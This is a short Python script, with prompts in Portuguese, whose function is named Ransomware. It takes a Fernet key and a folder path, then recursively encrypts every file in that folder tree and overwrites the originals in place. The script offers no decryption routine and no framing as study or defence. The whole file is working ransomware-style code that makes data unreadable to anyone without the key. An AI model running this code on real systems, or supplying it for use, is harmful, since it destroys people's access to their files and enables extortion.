import os
from cryptography.fernet import Fernet

def main():
    print("A chave do Fernet precisa ser uma sequência de 32 bytes")
    print("Digite a chave, lembre-se de guardá-la com cuidado")

    key = input(": ")

    try:
        pasta = input("Digite o caminho da pasta que quer criptografar: ")
        Ransomware(pasta, key)
        print("Arquivos criptografados com sucesso.")
    except FileNotFoundError:
        print(f"Diretório não encontrado: {pasta}")
    except ValueError:
        print("A chave do Fernet precisa ser uma sequência de 32 bytes.")

def Ransomware(pasta, key):
    fernet = Fernet(key)
    arquivos = []
    pastas_dentro = []

    try:
        # Lista todos os arquivos e subdiretórios
        conteudo = os.listdir(pasta)

        for item in conteudo:
            item_path = os.path.join(pasta, item)
            if os.path.isfile(item_path):
                arquivos.append(item_path)
            elif os.path.isdir(item_path):
                pastas_dentro.append(item_path)

        # Criptografa todos os arquivos
        for file_path in arquivos:
            try:
                with open(file_path, 'rb') as arquivo:
                    conteudo = arquivo.read()

                criptografado = fernet.encrypt(conteudo)

                with open(file_path, 'wb') as arquivo_criptografado:
                    arquivo_criptografado.write(criptografado)

            except FileNotFoundError:
                print(f"Arquivo não encontrado: {file_path}")
            except Exception as e:
                print(f"Erro ao criptografar o arquivo {file_path}: {e}")

        # Criptografa todos os subdiretórios em cadeia
        for subpasta in pastas_dentro:
            Ransomware(subpasta, key)

    except Exception as e:
        print(f"Erro ao processar diretório {pasta}: {e}")

if __name__ == "__main__":
    main()

